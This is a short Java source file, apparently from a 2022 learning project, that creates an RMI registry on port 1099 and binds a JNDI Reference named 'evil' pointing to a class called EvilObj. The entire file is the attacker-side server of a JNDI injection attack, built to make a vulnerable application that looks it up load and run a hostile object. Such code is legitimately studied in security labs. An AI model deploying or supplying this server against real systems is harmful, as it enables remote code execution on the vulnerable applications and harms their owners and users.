package com.spring.rmi;

import com.sun.jndi.rmi.registry.ReferenceWrapper;

import javax.naming.Reference;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

/**
 * @Author 王景辉
 * @Site
 * @Create 2022-05-24-9:05
 **/
public class RMIServer {
    public static void main(String[] args) {
        try {
            int port = 1099;
            LocateRegistry.createRegistry(port);
//            LocateRegistry.getRegistry(port);
            Registry registry = LocateRegistry.getRegistry();
            Reference reference = new Reference("com.spring.rmi.EvilObj","com.spring.rmi.EvilObj",null);
            ReferenceWrapper referenceWrapper = new ReferenceWrapper(reference);
            registry.bind("evil",referenceWrapper);
            System.out.println("Create RMI registry on port" + port);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
